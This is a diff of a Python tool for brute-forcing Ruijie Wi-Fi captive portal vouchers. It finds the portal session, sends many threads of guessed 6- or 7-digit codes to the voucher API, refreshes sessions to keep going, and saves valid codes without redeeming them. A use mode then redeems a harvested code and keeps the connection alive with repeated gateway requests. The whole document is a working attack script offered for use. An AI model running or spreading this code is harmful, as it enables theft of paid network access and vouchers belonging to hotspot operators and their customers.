@@ -1,24 +1,18 @@
 #!/usr/bin/env python3
 """
-Ruijie Voucher Brute-Force v1
-Random order, multi-threaded, with live progress.
+Ruijie Voucher Finder v2
+Finds valid codes WITHOUT consuming them. Saves results to file.
 """
-import sys, threading, time, urllib.parse, queue, random, os
+import sys, threading, time, urllib.parse, queue, random, os, datetime
 import requests, urllib3
 urllib3.disable_warnings()
 
-FOUND = threading.Event()
-FOUND_CODE = None
-FOUND_LOGON_URL = None
+FOUND_CODES = []     # list of (code, logonUrl)
 TRIED = 0
 TOTAL = 0
 LOCK = threading.Lock()
-
-def check_online():
-    try:
-        r = requests.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=False)
-        return r.status_code == 204
-    except: return False
+FOUND_LOCK = threading.Lock()
+STOP = threading.Event()
 
 def fmt_eta(rem, rate):
     if rate <= 0: return "?m"
@@ -27,26 +21,40 @@ def fmt_eta(rem, rate):
     m, s = divmod(r, 60)
     return f"{h}h{m:02d}m" if h else f"{m}m{s:02d}s"
 
-def progress_printer(total, stop):
+def progress_printer(total, found_file):
     global TRIED
     last = 0
-    while not stop.is_set() and not FOUND.is_set():
+    while not STOP.is_set():
         time.sleep(5)
         with LOCK: tried = TRIED
+        with FOUND_LOCK: nfound = len(FOUND_CODES)
         rate = (tried - last) / 5
         rem = total - tried
         eta = fmt_eta(rem, rate) if rate > 0 else "?m"
-        print(f"  {tried}/{total} ({tried*100/total:.1f}%) | {rate:.0f}/s | ETA: {eta}")
+        status = f"  {tried}/{total} ({tried*100/total:.1f}%) | {rate:.0f}/s | ETA: {eta} | Found: {nfound}"
+        if nfound and found_file:
+            status += f" (saved to {found_file.name})"
+        print(status)
         last = tried
 
-def worker(code_queue, sid_data, params, refresh_every, delay):
-    global TRIED, FOUND_CODE, FOUND_LOGON_URL
+def refresh_session(host, params):
+    try:
+        rs = requests.Session()
+        r = rs.get(f"{host}/api/auth/wifidog?stage=portal&{params}", timeout=10)
+        ns = urllib.parse.parse_qs(urllib.parse.urlparse(r.url).query).get("sessionId", [""])[0]
+        rs.close()
+        return ns
+    except: return None
+
+def worker(code_queue, sid_data, host, params, refresh_every, delay, consume):
+    global TRIED
     sess = requests.Session()
     sess.verify = False
     sess.headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"
+    api_url = f"{host}/api/auth/voucher/?lang=en_US"
     local_count = 0
 
-    while not FOUND.is_set():
+    while not STOP.is_set():
         try:
             code = code_queue.get_nowait()
         except queue.Empty:
@@ -54,8 +62,6 @@ def worker(code_queue, sid_data, params, refresh_every, delay):
 
         with LOCK:
             sid = sid_data["sid"]
-            host = sid_data["host"]
-        api_url = f"{host}/api/auth/voucher/?lang=en_US"
 
         try:
             r = sess.post(api_url, json={
@@ -63,24 +69,26 @@ def worker(code_queue, sid_data, params, refresh_every, delay):
             }, timeout=5)
             j = r.json()
             if j.get("success") == True and j.get("result", {}).get("authResult") == "1":
-                FOUND_CODE = code
-                FOUND_LOGON_URL = j["result"]["logonUrl"]
-                FOUND.set()
-                break
-        except: pass
+                logon_url = j["result"]["logonUrl"]
+                with FOUND_LOCK:
+                    FOUND_CODES.append((code, logon_url))
+                print(f"\n  >>> VALID: {code}")
+                # Optionally consume (follow logonUrl)
+                if consume:
+                    try:
+                        r2 = sess.get(logon_url, timeout=5, allow_redirects=False)
+                        print(f"      Consumed -> {r2.status_code}")
+                    except: pass
+        except:
+            pass
 
         with LOCK: TRIED += 1
 
         local_count += 1
         if local_count >= refresh_every:
-            try:
-                rs = requests.Session()
-                r = rs.get(f"{host}/api/auth/wifidog?stage=portal&{params}", timeout=10)
-                ns = urllib.parse.parse_qs(urllib.parse.urlparse(r.url).query).get("sessionId", [""])[0]
-                if ns:
-                    with LOCK: sid_data["sid"] = ns
-                rs.close()
-            except: pass
+            ns = refresh_session(host, params)
+            if ns:
+                with LOCK: sid_data["sid"] = ns
             local_count = 0
 
         if delay:
@@ -88,38 +96,85 @@ def worker(code_queue, sid_data, params, refresh_every, delay):
 
     sess.close()
 
-def keepalive(sid_data, gw_addr, gw_port):
-    """Keep session alive after finding code"""
-    sess = requests.Session()
-    while True:
-        with LOCK:
-            sid = sid_data["sid"]
-        try:
-            sess.post(
-                f"http://{gw_addr}:{gw_port}/wifidog/auth",
-                params={"token": sid, "phoneNumber": ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=15))},
-                headers={"Content-Type": "application/octet-stream", "Content-Length": "0"},
-                timeout=3,
-            )
-        except: pass
-        time.sleep(0.1)
-
 def main():
     global TOTAL
     import argparse
-    parser = argparse.ArgumentParser(description="Ruijie Voucher Brute-Force")
+    parser = argparse.ArgumentParser(description="Ruijie Voucher Finder")
     parser.add_argument("--type", type=int, default=1, choices=[1, 2], help="1=6-digit, 2=7-digit")
     parser.add_argument("--start", type=int, help="Range start")
     parser.add_argument("--end", type=int, help="Range end")
     parser.add_argument("--threads", type=int, default=30, help="Worker threads")
     parser.add_argument("--delay", type=float, default=0, help="Delay per attempt (ms)")
     parser.add_argument("--wordlist", type=str, help="File with codes to try")
+    parser.add_argument("--output", type=str, default="", help="Save valid codes to file")
     parser.add_argument("--refresh-every", type=int, default=500, help="Refresh session every N attempts")
-    parser.add_argument("--online", action="store_true", help="Go online when code found")
+    parser.add_argument("--consume", action="store_true", help="CONSUME found codes (use with caution)")
     parser.add_argument("--seed", type=int, default=None, help="Random seed for reproducibility")
+    parser.add_argument("--use", type=str, default=None, help="Use a specific code and go online")
     args = parser.parse_args()
 
-    # Load codes
+    # ---- USE MODE: consume a single code ----
+    if args.use:
+        print(f"[Use] Code: {args.use}")
+        sess = requests.Session()
+        sess.verify = False
+        sess.headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"
+        r = sess.get("http://connectivitycheck.gstatic.com/generate_204", timeout=10, allow_redirects=False)
+        if r.status_code == 204:
+            print("[!] Already online")
+            return
+        portal_url = r.headers.get("Location", "")
+        if not portal_url:
+            r = sess.get("http://connectivitycheck.gstatic.com/generate_204", timeout=10, allow_redirects=True)
+            portal_url = r.url
+        parsed = urllib.parse.urlparse(portal_url)
+        params = parsed.query
+        host = f"{parsed.scheme}://{parsed.netloc}"
+        qp = urllib.parse.parse_qs(params)
+        sid = qp.get("sessionId", [""])[0]
+        if not sid:
+            r = sess.get(f"{host}/api/auth/wifidog?stage=portal&{params}", timeout=10)
+            sid = urllib.parse.parse_qs(urllib.parse.urlparse(r.url).query).get("sessionId", [""])[0]
+        if not sid:
+            print("[!] No sessionId")
+            return
+        gw_addr = qp.get("gw_address", ["192.168.10.1"])[0]
+        gw_port = qp.get("gw_port", ["2060"])[0]
+        print(f"Session: {sid[:16]}...  GW: {gw_addr}:{gw_port}")
+        # Call API
+        r = sess.post(f"{host}/api/auth/voucher/?lang=en_US", json={
+            "accessCode": args.use, "sessionId": sid, "apiVersion": 1
+        }, timeout=5)
+        j = r.json()
+        if j.get("success") == True and j.get("result", {}).get("authResult") == "1":
+            logon_url = j["result"]["logonUrl"]
+            print(f"logonUrl: {logon_url}")
+            r2 = sess.get(logon_url, timeout=5, allow_redirects=False)
+            print(f"Gateway: {r2.status_code}")
+            time.sleep(2)
+            # Check online
+            try:
+                r3 = requests.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=False)
+                if r3.status_code == 204:
+                    print("*** ONLINE ***")
+                    # Start keepalive
+                    def ka():
+                        while True:
+                            sess.post(f"http://{gw_addr}:{gw_port}/wifidog/auth",
+                                params={"token": sid, "phoneNumber": ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=15))},
+                                headers={"Content-Type": "application/octet-stream", "Content-Length": "0"},
+                                timeout=3)
+                            time.sleep(0.1)
+                    threading.Thread(target=ka, daemon=True).start()
+                    print("Keepalive running. Ctrl+C to stop.")
+                    try: while True: time.sleep(10)
+                    except KeyboardInterrupt: print("\nDone")
+            except: pass
+        else:
+            print(f"Failed: {j.get('message', '?')}")
+        return
+
+    # ---- FINDER MODE ----
     if args.wordlist:
         with open(args.wordlist) as f:
             codes_raw = [l.strip() for l in f if l.strip()]
@@ -141,7 +196,6 @@ def main():
         random.seed(args.seed)
     random.shuffle(codes)
 
-    # Put in queue
     code_queue = queue.Queue()
     for c in codes:
         code_queue.put(c)
@@ -150,54 +204,49 @@ def main():
     sess = requests.Session()
     sess.verify = False
     sess.headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"
-
-    # First check: generate_204 without redirects to get portal URL
     r = sess.get("http://connectivitycheck.gstatic.com/generate_204", timeout=10, allow_redirects=False)
     if r.status_code == 204:
-        print("[!] Already online - must be on captive portal network")
+        print("[!] Already online - need captive portal")
         return
-
-    # Get portal redirect URL from Location header
     portal_url = r.headers.get("Location", "")
     if not portal_url:
-        # Try with redirects
         r = sess.get("http://connectivitycheck.gstatic.com/generate_204", timeout=10, allow_redirects=True)
         portal_url = r.url
-
-    print(f"[Debug] Portal URL: {portal_url[:100]}...")
-
     parsed = urllib.parse.urlparse(portal_url)
     params = parsed.query
     host = f"{parsed.scheme}://{parsed.netloc}"
     qp = urllib.parse.parse_qs(params)
 
-    # If portal URL already has sessionId, use it directly
     sid = qp.get("sessionId", [""])[0]
     if not sid:
-        # Otherwise get sessionId from wifidog API
         r = sess.get(f"{host}/api/auth/wifidog?stage=portal&{params}", timeout=10)
         sid = urllib.parse.parse_qs(urllib.parse.urlparse(r.url).query).get("sessionId", [""])[0]
-
     if not sid:
-        print("[!] No sessionId from portal")
-        print(f"[Debug] Final URL: {r.url}")
+        print("[!] No sessionId")
         return
 
     gw_addr = qp.get("gw_address", ["192.168.10.1"])[0]
     gw_port = qp.get("gw_port", ["2060"])[0]
 
+    out_file = None
+    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+    out_name = args.output or f"valid_codes_{timestamp}.txt"
+    out_file = open(out_name, "w")
     print(f"Host: {host}  GW: {gw_addr}:{gw_port}")
     print(f"Session: {sid[:16]}...  Threads: {args.threads}")
-    print(f"Starting brute force... (Ctrl+C to stop)\n")
+    print(f"Output: {out_name}")
+    print(f"Consume: {'YES' if args.consume else 'NO (just check)'}")
+    print(f"Starting... (Ctrl+C to stop)\n")
 
-    sid_data = {"sid": sid, "host": host}
+    sid_data = {"sid": sid}
 
     stop_prog = threading.Event()
-    threading.Thread(target=progress_printer, args=(TOTAL, stop_prog), daemon=True).start()
+    prog_thread = threading.Thread(target=progress_printer, args=(TOTAL, out_file), daemon=True)
+    prog_thread.start()
 
     threads = []
     for _ in range(args.threads):
-        t = threading.Thread(target=worker, args=(code_queue, sid_data, params, args.refresh_every, args.delay), daemon=True)
+        t = threading.Thread(target=worker, args=(code_queue, sid_data, host, params, args.refresh_every, args.delay, args.consume), daemon=True)
         t.start()
         threads.append(t)
 
@@ -206,35 +255,30 @@ def main():
             t.join()
     except KeyboardInterrupt:
         print("\n[Stopped]")
+    finally:
+        STOP.set()
 
-    stop_prog.set()
+    prog_thread.join(timeout=1)
 
-    if FOUND_CODE:
-        print(f"\n=== VALID CODE: {FOUND_CODE} ===")
-        if args.online and FOUND_LOGON_URL:
-            print(f"logonUrl: {FOUND_LOGON_URL}")
-            r = sess.get(FOUND_LOGON_URL, timeout=5, allow_redirects=False)
-            print(f"Gateway response: {r.status_code}")
-            time.sleep(2)
-            if check_online():
-                print("*** ONLINE ***")
-                threading.Thread(target=keepalive, args=(sid_data, gw_addr, gw_port), daemon=True).start()
-                print("Keepalive running. Ctrl+C to stop.")
-                try:
-                    while True: time.sleep(10)
-                except KeyboardInterrupt:
-                    print("\nDone")
-            else:
-                # Follow the redirect from logonUrl
-                loc = r.headers.get("Location", "")
-                if loc:
-                    print(f"Redirect: {loc[:60]}...")
-                    r2 = sess.get(loc, timeout=5)
-                    time.sleep(2)
-                    if check_online():
-                        print("*** ONLINE ***")
+    # Write found codes to file
+    with FOUND_LOCK:
+        found = FOUND_CODES[:]
+
+    if out_file:
+        for code, logon_url in found:
+            out_file.write(f"{code}\n")
+        out_file.close()
+        print(f"\nSaved {len(found)} valid codes to {out_name}")
+
+    if found:
+        print(f"\n=== {len(found)} VALID CODES FOUND ===")
+        for code, logon_url in found[:20]:
+            print(f"  {code}")
+        if len(found) > 20:
+            print(f"  ... and {len(found)-20} more (see {out_name})")
+        print(f"\nUse one: python brute.py --use CODE")
     else:
-        print("No valid code found")
+        print("\nNo valid codes found")
 
 if __name__ == "__main__":
     main()
